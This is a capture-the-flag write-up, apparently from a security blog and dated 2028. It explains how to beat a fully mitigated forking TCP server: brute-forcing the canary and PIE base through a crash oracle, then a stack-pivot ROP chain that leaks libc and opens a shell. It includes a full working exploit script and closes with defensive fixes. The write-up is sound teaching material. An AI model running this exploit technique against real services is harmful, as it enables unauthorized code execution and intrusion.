---
layout: post
title: "Old Bridge"
date: 2028-06-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, stack-canary, pie, aslr, brute-force, ret2csu, ret2libc, rop, fork-server]
description: "A Hard Pwn challenge: a forking TCP server has a stack buffer overflow but full mitigations (canary, NX, PIE) and no info leak — because fork() shares the parent's memory, the canary and PIE base are constant across connections and can be brute-forced one byte at a time with a reply-vs-EOF oracle, then a stack-pivot ROP leaks libc and pops a shell."
---

## Overview

Old Bridge is a Hard **Pwn** challenge. You get a single 64-bit ELF, `oldbridge`, that runs as a
**forking TCP server**: it binds a port, then `accept()`s connections and `fork()`s a child per
client. The binary ships with every mitigation on — **Canary + NX + PIE + Partial RELRO** — and
there is no information-leak primitive. The path to a shell is: recognize that a fork server
makes the canary and PIE base *reusable*, brute them byte-by-byte with a crash oracle, then turn
saved-RIP control into a full ROP chain via a stack pivot, leak libc, and call `system("/bin/sh")`.

## The technique

The child handler `check_username(fd)` reads far too many bytes into a fixed stack buffer — a
classic [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html):

```c
char buf[0x410];
read(fd, buf, 0x420);                  // 0x420 into a 0x410 buffer -> 24-byte overflow
for (i = 0; i < n; i++) buf[i] ^= 0xd; // every received byte is XOR 0xd in place
if (memcmp(buf, "il{dih", 6) == 0)     // "il{dih" ^ 0xd == "davide"
    return 1;                          // -> main writes "Username found!" back
```

The 24 overflow bytes cover the saved **canary**, saved **RBP**, and the **return address**. The
username check passes when we send `davide` (because the server XORs our input by `0xd` before
comparing), which makes the child send a reply we can observe.

The key insight is that a **fork server does not re-randomize secrets**: `fork()` gives the child
an exact copy of the parent's memory, so the stack canary *and* the PIE/stack ASLR base are
**identical on every connection**. A secret you can retry against for free is not a secret. So we
brute each byte with a **reply-vs-EOF oracle**:

- **Correct byte** → the canary/return stays valid, the child runs on and writes
  `"Username found!"` back on the socket → we get a second line.
- **Wrong byte** → `__stack_chk_fail` (canary) or a bad return address (SIGSEGV) kills the
  child → the connection closes with no reply (EOF).

Recover the 8-byte canary, then the 8-byte saved RBP, then the 8-byte return address. Since the
return site is at a fixed offset in `.text`, `elf_base = leaked_ret − 0xecf` — that defeats PIE.

With only saved-RIP control and one overflow slot (no room for a chain), we **pivot into the
buffer** we fully control: set the overwritten saved RBP to `real_rbp − 0x478` and the return
address to a `leave; ret` gadget, so the function epilogue's `leave; ret` plus the gadget's
`leave; ret` double-pivot `rsp` onto `buffer+0x10`, where the ROP lives.

- **Stage 1 (leak libc):** ret2csu-style `pop rdi / pop rsi;pop r15 / pop rdx` gadgets call
  `write(connfd, write@GOT, 8)`, then return to `check_username` again. The leaked `write`
  address gives the libc base. The `pop rdx` needed to set the write *length* hides in an
  otherwise-unused `helper()` function — miss it and the leak sends nothing.
- **Stage 2 (shell):** `dup2(connfd, 0/1/2)` wires the socket to stdio, then `system("/bin/sh")`.

## Solution

The full exploit — brute (canary → saved RBP → return address) → stack pivot → `write` GOT leak
→ `dup2` + `system` — is below. Run it as `python3 solve.py <ip>:<port>`.

```python
#!/usr/bin/env python3
# Old Bridge — fork-server canary+PIE brute -> stack-pivot ROP -> ret2libc.
import socket
import sys
from concurrent.futures import ThreadPoolExecutor
from pwn import context, log, p64, p8, u64, remote

context.binary = 'files/oldbridge'
HOST, PORT = (sys.argv[1].split(':') if len(sys.argv) > 1 else ('127.0.0.1', '0'))
PORT = int(PORT)
KEY = 0xd
POOL = 8

def xor(b, k=KEY):
    return bytes([c ^ k for c in b])

def oracle(payload):
    for _ in range(6):
        try:
            s = socket.create_connection((HOST, PORT), timeout=3)
        except OSError:
            continue                     # backlog full / transient refuse -> retry
        try:
            s.settimeout(3)
            s.recv(64)                   # "Username: " prompt
            s.sendall(payload)
            s.settimeout(1.3)
            extra = s.recv(64)           # "Username found!" only on the correct path
            return len(extra) > 0
        except (socket.timeout, ConnectionError, OSError):
            return False
        finally:
            s.close()
    return False

def brute(prefix, name, value=b'', nbytes=8):
    prog = log.progress(name)
    while len(value) < nbytes:
        winner = {}
        def test(c):
            if winner:
                return                   # already won this position -> skip
            if oracle(prefix + value + p8(c)):
                winner.setdefault('c', c)
        with ThreadPoolExecutor(max_workers=POOL) as ex:
            futs = [ex.submit(test, c) for c in range(256)]
            for f in futs:
                f.result()
                if winner:               # early-exit the moment a byte wins
                    break
        if not winner:
            prog.failure(f'no byte at pos {len(value)}')
            raise SystemExit(1)
        value += p8(winner['c'])
        prog.status(repr(value))
    prog.success(repr(value))
    return value

def main():
    offset = 1026
    xor_user = b'il{dih'                 # xor 0xd -> "davide"
    junk = xor(xor_user) + b'A' * offset

    xc = brute(junk, 'canary', value=xor(b'\0'))                 # canary low byte is 0x00
    # rbp/ret are 48-bit VAs: only the top 2 bytes are reliably 0x00. Brute the rest -- the PIE
    # base high bytes vary under ASLR more than 0x55,0x55, so do NOT assume them.
    xr = brute(junk + xc, 'saved rbp', nbytes=6) + xor(b'\x00\x00')
    xa = brute(junk + xc + xr, 'return addr', value=xor(b'\xcf'), nbytes=6) + xor(b'\x00\x00')

    canary = u64(xor(xc).ljust(8, b'\0'))
    saved_rbp = u64(xor(xr).ljust(8, b'\0'))
    ret_addr = u64(xor(xa).ljust(8, b'\0'))
    elf = ret_addr - 0xecf
    log.success(f'canary={hex(canary)} rbp={hex(saved_rbp)} ELF={hex(elf)}')

    pop_rdi = elf + 0xf73
    pop_rsi_r15 = elf + 0xf71
    pop_rdx = elf + 0xb53                 # hides in the unused helper()
    leave_ret = elf + 0xb6d
    write_got = elf + 0x202020
    write_plt = elf + 0x910
    check_username = elf + 0xb6f
    sock_fd = 4

    def send(pay):
        with context.local(log_level='CRITICAL'):
            r = remote(HOST, PORT)
        r.recvuntil(b'Username: ')
        r.send(xor(pay))
        return r

    # Stage 1: pivot into buffer, write(4, write_got, 8) -> libc leak, loop to check_username.
    pay = xor_user + b'A' * (0x10 - len(xor_user))
    pay += p64(pop_rdi) + p64(sock_fd)
    pay += p64(pop_rsi_r15) + p64(write_got) + p64(0)
    pay += p64(pop_rdx) + p64(8)          # rdx = write length (MUST be set)
    pay += p64(write_plt)
    pay += p64(check_username)
    pay += b'A' * (offset + len(xor_user) - len(pay))
    pay += p64(canary) + p64(saved_rbp - 0x478) + p64(leave_ret)

    r = send(pay)
    leak = r.recvuntil(b'Username: ').rstrip(b'Username: ')
    write_addr = u64(leak.ljust(8, b'\0'))
    log.success(f'write@libc={hex(write_addr)}')
    r.close()

    # Challenge libc offsets (write low12 == 0x280 confirmed on the live target).
    libc = write_addr - 0xf7280
    dup2, system, binsh = libc + 0xf7940, libc + 0x45390, libc + 0x18cd17

    # Stage 2: dup2(4, 0/1/2) then system("/bin/sh").
    pay = xor_user + b'A' * (0x10 - len(xor_user))
    for fd in (0, 1, 2):
        pay += p64(pop_rdi) + p64(sock_fd)
        pay += p64(pop_rsi_r15) + p64(fd) + p64(0)
        pay += p64(dup2)
    pay += p64(pop_rdi) + p64(binsh) + p64(system)
    pay += b'A' * (offset + len(xor_user) - len(pay))
    pay += p64(canary) + p64(saved_rbp - 0x478) + p64(leave_ret)

    r = send(pay)
    r.sendline(b'id; cat /home/pwn/flag.txt')
    r.interactive()

if __name__ == '__main__':
    main()
```

Running it brutes the secrets, leaks libc, and drops a shell as the service user:

```bash
$ python3 solve.py <ip>:<port>
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
HTB{...}   # redacted
```

## Why it worked

A stack canary only protects you if it's *secret*, and PIE/ASLR only protects you if the base is
*unpredictable*. Both assumptions rely on the process being freshly randomized. A server that
`fork()`s workers **without `execve()`** re-uses the parent's memory image, so the canary and the
PIE/stack base are constant for the life of the parent — turning two "unguessable" secrets into
values you can brute one byte at a time. The reply-vs-EOF oracle needs no output or format bug, so
it works on a fully mitigated, "leakless" binary. The double-`leave; ret` pivot then converts a
one-slot overflow into a full ROP chain by reusing the 1 KB input buffer as ROP space.

A couple of details make or break the port: the `write()` **length register `rdx`** must be set
explicitly (there's a convenient `pop rdx; ret` in the unused `helper()`), and you must *not*
hardcode the high bytes of stack/PIE addresses (`0x55,0x55` / `0x7f`) — real ASLR varies, so
brute everything except the always-zero top two bytes of a 48-bit address.

## Fix / defense

`fork()` **then `execve()`** a fresh copy of the child per connection so the canary and PIE/stack
base are re-randomized on every connection — cross-connection brute force then learns nothing.
Beyond that, bound the read to `sizeof(buf)` so there is no [overflow](https://cwe.mitre.org/data/definitions/121.html)
at all, enable Full RELRO, and avoid shipping gadget-rich unused helper functions
(`pop rdx`, `syscall`).
